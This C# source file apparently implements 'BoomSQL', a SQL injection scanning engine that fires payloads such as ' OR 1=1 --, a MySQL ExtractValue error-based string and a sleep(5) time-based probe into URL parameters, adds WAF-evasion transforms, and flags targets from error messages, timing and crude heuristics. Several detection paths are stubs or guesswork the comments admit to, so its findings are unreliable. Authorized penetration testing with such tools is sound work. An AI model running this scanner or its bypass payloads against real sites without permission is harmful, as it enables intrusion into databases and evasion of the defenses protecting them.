using System;
using System.Collections.Generic;
using System.Linq;
using System.Net.Http;
using System.Text;
using System.Text.RegularExpressions;
using System.Threading.Tasks;
using System.Xml.Linq;
using System.IO;
using System.Threading;
using System.Web;

namespace BoomSQL.Core
{
    public class SqlInjectionEngine
    {
        private readonly HttpClient _httpClient;
        private readonly List<SqlInjectionPayload> _payloads;
        private readonly List<ErrorSignature> _errorSignatures;
        private readonly List<WafBypass> _wafBypasses;
        private readonly SqlInjectionConfig _config;

        public SqlInjectionEngine(HttpClient httpClient, SqlInjectionConfig config)
        {
            _httpClient = httpClient;
            _config = config;
            _payloads = LoadPayloads();
            _errorSignatures = LoadErrorSignatures();
            _wafBypasses = LoadWafBypasses();
        }

        public async Task<SqlInjectionResult> TestUrlAsync(string url, CancellationToken cancellationToken = default)
        {
            var result = new SqlInjectionResult { Url = url };
            var vulnerabilities = new List<VulnerabilityDetails>();

            foreach (var payload in _payloads)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                try
                {
                    // Test original payload
                    var testResult = await TestPayloadAsync(url, payload, cancellationToken);
                    if (testResult != null)
                    {
                        vulnerabilities.Add(testResult);
                    }

                    // Test with WAF bypasses if enabled
                    if (_config.EnableWafBypasses)
                    {
                        foreach (var bypass in _wafBypasses)
                        {
                            if (cancellationToken.IsCancellationRequested)
                                break;

                            var bypassedPayload = ApplyWafBypass(payload, bypass);
                            var bypassResult = await TestPayloadAsync(url, bypassedPayload, cancellationToken);
                            if (bypassResult != null)
                            {
                                bypassResult.BypassMethod = bypass.Title;
                                vulnerabilities.Add(bypassResult);
                            }
                        }
                    }
                }
                catch (Exception ex)
                {
                    result.Errors.Add($"Error testing payload '{payload.Title}': {ex.Message}");
                }
            }

            result.Vulnerabilities = vulnerabilities;
            result.IsVulnerable = vulnerabilities.Any();
            result.TotalPayloadsTested = _payloads.Count;
            result.TestDuration = DateTime.UtcNow - result.TestStartTime;

            return result;
        }

        private async Task<VulnerabilityDetails> TestPayloadAsync(string url, SqlInjectionPayload payload, CancellationToken cancellationToken)
        {
            // Test different injection points
            var injectionPoints = GetInjectionPoints(url);
            
            foreach (var injectionPoint in injectionPoints)
            {
                if (cancellationToken.IsCancellationRequested)
                    break;

                var testUrl = ApplyPayloadToUrl(url, payload, injectionPoint);
                
                // Test different HTTP methods
                var httpMethods = new[] { HttpMethod.Get, HttpMethod.Post };
                
                foreach (var method in httpMethods)
                {
                    if (cancellationToken.IsCancellationRequested)
                        break;

                    var vulnerability = await TestWithHttpMethodAsync(testUrl, payload, method, injectionPoint, cancellationToken);
                    if (vulnerability != null)
                    {
                        return vulnerability;
                    }
                }
            }

            return null;
        }

        private async Task<VulnerabilityDetails> TestWithHttpMethodAsync(string url, SqlInjectionPayload payload, HttpMethod method, InjectionPoint injectionPoint, CancellationToken cancellationToken)
        {
            try
            {
                var startTime = DateTime.UtcNow;
                HttpResponseMessage response;

                if (method == HttpMethod.Get)
                {
                    response = await _httpClient.GetAsync(url, cancellationToken);
                }
                else
                {
                    var content = new StringContent(payload.PayloadString, Encoding.UTF8, "application/x-www-form-urlencoded");
                    response = await _httpClient.PostAsync(url, content, cancellationToken);
                }

                var responseTime = DateTime.UtcNow - startTime;
                var responseText = await response.Content.ReadAsStringAsync();

                // Analyze response for vulnerabilities
                var detectionResult = AnalyzeResponse(response, responseText, responseTime, payload);
                
                if (detectionResult.IsVulnerable)
                {
                    return new VulnerabilityDetails
                    {
                        Payload = payload,
                        InjectionPoint = injectionPoint,
                        HttpMethod = method.Method,
                        ResponseTime = responseTime,
                        ResponseCode = (int)response.StatusCode,
                        DetectionMethod = detectionResult.DetectionMethod,
                        Confidence = detectionResult.Confidence,
                        DatabaseType = detectionResult.DatabaseType,
                        VulnerabilityType = detectionResult.VulnerabilityType,
                        Evidence = detectionResult.Evidence,
                        Response = responseText
                    };
                }
            }
            catch (HttpRequestException ex)
            {
                // Handle HTTP errors
                return null;
            }
            catch (TaskCanceledException)
            {
                // Handle timeout
                return null;
            }

            return null;
        }

        private DetectionResult AnalyzeResponse(HttpResponseMessage response, string responseText, TimeSpan responseTime, SqlInjectionPayload payload)
        {
            var result = new DetectionResult();

            // Error-based detection
            var errorDetection = DetectErrorBased(responseText);
            if (errorDetection.IsVulnerable)
            {
                result.IsVulnerable = true;
                result.DetectionMethod = "Error-based";
                result.DatabaseType = errorDetection.DatabaseType;
                result.Confidence = errorDetection.Confidence;
                result.Evidence = errorDetection.Evidence;
                result.VulnerabilityType = "Error-based SQL Injection";
                return result;
            }

            // Time-based detection
            if (payload.Category == "time" && responseTime.TotalSeconds > _config.TimeBasedThreshold)
            {
                result.IsVulnerable = true;
                result.DetectionMethod = "Time-based";
                result.Confidence = 0.8;
                result.VulnerabilityType = "Time-based Blind SQL Injection";
                result.Evidence = $"Response time: {responseTime.TotalSeconds:F2} seconds";
                return result;
            }

            // Boolean-based detection (would require baseline comparison)
            if (payload.Category == "boolean")
            {
                var booleanDetection = DetectBooleanBased(responseText, response.StatusCode);
                if (booleanDetection.IsVulnerable)
                {
                    result.IsVulnerable = true;
                    result.DetectionMethod = "Boolean-based";
                    result.Confidence = booleanDetection.Confidence;
                    result.VulnerabilityType = "Boolean-based Blind SQL Injection";
                    result.Evidence = booleanDetection.Evidence;
                    return result;
                }
            }

            // Union-based detection
            if (payload.Category == "union")
            {
                var unionDetection = DetectUnionBased(responseText);
                if (unionDetection.IsVulnerable)
                {
                    result.IsVulnerable = true;
                    result.DetectionMethod = "Union-based";
                    result.Confidence = unionDetection.Confidence;
                    result.VulnerabilityType = "Union-based SQL Injection";
                    result.Evidence = unionDetection.Evidence;
                    return result;
                }
            }

            // Content-length based detection
            var contentLengthDetection = DetectContentLengthBased(response.Content.Headers.ContentLength);
            if (contentLengthDetection.IsVulnerable)
            {
                result.IsVulnerable = true;
                result.DetectionMethod = "Content-length based";
                result.Confidence = contentLengthDetection.Confidence;
                result.VulnerabilityType = "Content-length based SQL Injection";
                result.Evidence = contentLengthDetection.Evidence;
                return result;
            }

            return result;
        }

        private DetectionResult DetectErrorBased(string responseText)
        {
            var result = new DetectionResult();
            
            foreach (var signature in _errorSignatures)
            {
                foreach (var pattern in signature.Patterns)
                {
                    if (Regex.IsMatch(responseText, pattern, RegexOptions.IgnoreCase))
                    {
                        result.IsVulnerable = true;
                        result.DatabaseType = signature.Database;
                        result.Confidence = signature.Severity == "high" ? 0.95 : 0.75;
                        result.Evidence = $"Error pattern matched: {pattern}";
                        return result;
                    }
                }
            }

            return result;
        }

        private DetectionResult DetectBooleanBased(string responseText, System.Net.HttpStatusCode statusCode)
        {
            var result = new DetectionResult();
            
            // This would require baseline comparison in a real implementation
            // For now, we'll use simple heuristics
            
            if (statusCode == System.Net.HttpStatusCode.OK && responseText.Length > 0)
            {
                // Check for common true/false indicators
                var trueIndicators = new[] { "welcome", "success", "login", "dashboard", "profile" };
                var falseIndicators = new[] { "error", "invalid", "fail", "denied", "unauthorized" };
                
                bool hasTrue = trueIndicators.Any(indicator => responseText.Contains(indicator, StringComparison.OrdinalIgnoreCase));
                bool hasFalse = falseIndicators.Any(indicator => responseText.Contains(indicator, StringComparison.OrdinalIgnoreCase));
                
                if (hasTrue && !hasFalse)
                {
                    result.IsVulnerable = true;
                    result.Confidence = 0.6;
                    result.Evidence = "Response suggests TRUE condition";
                }
            }

            return result;
        }

        private DetectionResult DetectUnionBased(string responseText)
        {
            var result = new DetectionResult();
            
            // Check for union-based indicators
            var unionIndicators = new[]
            {
                @"\b\d+\b.*\b\d+\b.*\b\d+\b", // Numbers pattern like "1 2 3"
                @"version\(\)", // MySQL version function
                @"@@version", // SQL Server version
                @"user\(\)", // MySQL user function
                @"database\(\)", // MySQL database function
                @"schema\(\)", // Schema function
                @"table_name", // Information schema
                @"column_name" // Information schema
            };
            
            foreach (var indicator in unionIndicators)
            {
                if (Regex.IsMatch(responseText, indicator, RegexOptions.IgnoreCase))
                {
                    result.IsVulnerable = true;
                    result.Confidence = 0.85;
                    result.Evidence = $"Union-based indicator found: {indicator}";
                    return result;
                }
            }

            return result;
        }

        private DetectionResult DetectContentLengthBased(long? contentLength)
        {
            var result = new DetectionResult();
            
            // This would require baseline comparison in a real implementation
            // For now, we'll use simple heuristics
            
            if (contentLength.HasValue && contentLength.Value > 0)
            {
                // Check for unusual content lengths that might indicate SQL injection
                if (contentLength.Value > 10000 || contentLength.Value < 100)
                {
                    result.IsVulnerable = true;
                    result.Confidence = 0.4;
                    result.Evidence = $"Unusual content length: {contentLength.Value}";
                }
            }

            return result;
        }

        private List<InjectionPoint> GetInjectionPoints(string url)
        {
            var injectionPoints = new List<InjectionPoint>();
            
            // Parse URL for parameters
            var uri = new Uri(url);
            var queryParams = System.Web.HttpUtility.ParseQueryString(uri.Query);
            
            foreach (string paramName in queryParams.AllKeys)
            {
                if (paramName != null)
                {
                    injectionPoints.Add(new InjectionPoint
                    {
                        Type = InjectionPointType.UrlParameter,
                        Name = paramName,
                        Value = queryParams[paramName]
                    });
                }
            }
            
            // Add other injection points
            injectionPoints.Add(new InjectionPoint
            {
                Type = InjectionPointType.Header,
                Name = "User-Agent",
                Value = ""
            });
            
            injectionPoints.Add(new InjectionPoint
            {
                Type = InjectionPointType.Header,
                Name = "Referer",
                Value = ""
            });
            
            injectionPoints.Add(new InjectionPoint
            {
                Type = InjectionPointType.Cookie,
                Name = "session",
                Value = ""
            });

            return injectionPoints;
        }

        private string ApplyPayloadToUrl(string url, SqlInjectionPayload payload, InjectionPoint injectionPoint)
        {
            switch (injectionPoint.Type)
            {
                case InjectionPointType.UrlParameter:
                    return ReplaceUrlParameter(url, injectionPoint.Name, payload.PayloadString);
                case InjectionPointType.Header:
                    // Headers would be handled at the HTTP request level
                    return url;
                case InjectionPointType.Cookie:
                    // Cookies would be handled at the HTTP request level
                    return url;
                default:
                    return url;
            }
        }

        private string ReplaceUrlParameter(string url, string paramName, string newValue)
        {
            var uri = new Uri(url);
            var queryParams = System.Web.HttpUtility.ParseQueryString(uri.Query);
            queryParams[paramName] = newValue;
            
            var uriBuilder = new UriBuilder(uri)
            {
                Query = queryParams.ToString()
            };
            
            return uriBuilder.ToString();
        }

        private SqlInjectionPayload ApplyWafBypass(SqlInjectionPayload payload, WafBypass bypass)
        {
            var newPayload = new SqlInjectionPayload
            {
                Title = $"{payload.Title} (WAF Bypass: {bypass.Title})",
                PayloadString = bypass.Apply(payload.PayloadString),
                Risk = payload.Risk,
                Platform = payload.Platform,
                Category = payload.Category
            };

            return newPayload;
        }

        private List<SqlInjectionPayload> LoadPayloads()
        {
            var payloads = new List<SqlInjectionPayload>();
            
            try
            {
                var payloadFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "payloads.xml");
                if (File.Exists(payloadFile))
                {
                    var doc = XDocument.Load(payloadFile);
                    payloads = doc.Descendants("payload")
                        .Select(p => new SqlInjectionPayload
                        {
                            Title = p.Attribute("title")?.Value ?? "Unknown",
                            PayloadString = p.Value,
                            Risk = int.Parse(p.Attribute("risk")?.Value ?? "1"),
                            Platform = p.Attribute("platform")?.Value ?? "generic",
                            Category = p.Attribute("category")?.Value ?? "generic"
                        })
                        .ToList();
                }
            }
            catch (Exception ex)
            {
                // Log error
                Console.WriteLine($"Error loading payloads: {ex.Message}");
            }

            // Add default payloads if none loaded
            if (payloads.Count == 0)
            {
                payloads.AddRange(GetDefaultPayloads());
            }

            return payloads;
        }

        private List<ErrorSignature> LoadErrorSignatures()
        {
            var signatures = new List<ErrorSignature>();
            
            try
            {
                var signatureFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "error_signatures.xml");
                if (File.Exists(signatureFile))
                {
                    var doc = XDocument.Load(signatureFile);
                    signatures = doc.Descendants("signature")
                        .Select(s => new ErrorSignature
                        {
                            Database = s.Attribute("database")?.Value ?? "unknown",
                            Severity = s.Attribute("severity")?.Value ?? "medium",
                            Patterns = s.Descendants("pattern").Select(p => p.Value).ToList()
                        })
                        .ToList();
                }
            }
            catch (Exception ex)
            {
                // Log error
                Console.WriteLine($"Error loading error signatures: {ex.Message}");
            }

            // Add default signatures if none loaded
            if (signatures.Count == 0)
            {
                signatures.AddRange(GetDefaultErrorSignatures());
            }

            return signatures;
        }

        private List<WafBypass> LoadWafBypasses()
        {
            var bypasses = new List<WafBypass>();
            
            try
            {
                var bypassFile = Path.Combine(AppDomain.CurrentDomain.BaseDirectory, "waf_bypasses.xml");
                if (File.Exists(bypassFile))
                {
                    var doc = XDocument.Load(bypassFile);
                    bypasses = doc.Descendants("bypass")
                        .Select(b => new WafBypass
                        {
                            Category = b.Attribute("category")?.Value ?? "generic",
                            Title = b.Attribute("title")?.Value ?? "Unknown",
                            Description = b.Element("description")?.Value ?? "",
                            Apply = CreateBypassFunction(b.Element("script")?.Value ?? "")
                        })
                        .ToList();
                }
            }
            catch (Exception ex)
            {
                // Log error
                Console.WriteLine($"Error loading WAF bypasses: {ex.Message}");
            }

            // Add default bypasses if none loaded
            if (bypasses.Count == 0)
            {
                bypasses.AddRange(GetDefaultWafBypasses());
            }

            return bypasses;
        }

        private Func<string, string> CreateBypassFunction(string script)
        {
            // For simplicity, return a default function
            // In a real implementation, this would compile the script
            return payload => payload;
        }

        private List<SqlInjectionPayload> GetDefaultPayloads()
        {
            return new List<SqlInjectionPayload>
            {
                new SqlInjectionPayload
                {
                    Title = "Generic SQL Injection",
                    PayloadString = "' OR 1=1 --",
                    Risk = 3,
                    Platform = "generic",
                    Category = "boolean"
                },
                new SqlInjectionPayload
                {
                    Title = "MySQL Error-based",
                    PayloadString = "' AND ExtractValue(1, concat(0x7e, version(), 0x7e)) --",
                    Risk = 4,
                    Platform = "mysql",
                    Category = "error"
                },
                new SqlInjectionPayload
                {
                    Title = "Time-based Blind",
                    PayloadString = "' AND sleep(5) --",
                    Risk = 3,
                    Platform = "mysql",
                    Category = "time"
                }
            };
        }

        private List<ErrorSignature> GetDefaultErrorSignatures()
        {
            return new List<ErrorSignature>
            {
                new ErrorSignature
                {
                    Database = "mysql",
                    Severity = "high",
                    Patterns = new List<string>
                    {
                        "You have an error in your SQL syntax",
                        "Warning: mysql_",
                        "MySQLSyntaxErrorException"
                    }
                },
                new ErrorSignature
                {
                    Database = "mssql",
                    Severity = "high",
                    Patterns = new List<string>
                    {
                        "Microsoft SQL Server",
                        "Incorrect syntax near",
                        "System.Data.SqlClient.SqlException"
                    }
                }
            };
        }

        private List<WafBypass> GetDefaultWafBypasses()
        {
            return new List<WafBypass>
            {
                new WafBypass
                {
                    Category = "case_manipulation",
                    Title = "Mixed Case",
                    Description = "Apply mixed case to payload",
                    Apply = payload => new string(payload.Select((c, i) => i % 2 == 0 ? char.ToUpper(c) : char.ToLower(c)).ToArray())
                },
                new WafBypass
                {
                    Category = "comment_injection",
                    Title = "MySQL Comment Injection",
                    Description = "Inject MySQL comments",
                    Apply = payload => payload.Replace(" ", "/**/")
                },
                new WafBypass
                {
                    Category = "url_encoding",
                    Title = "URL Encoding",
                    Description = "Apply URL encoding",
                    Apply = payload => Uri.EscapeDataString(payload)
                }
            };
        }
    }
}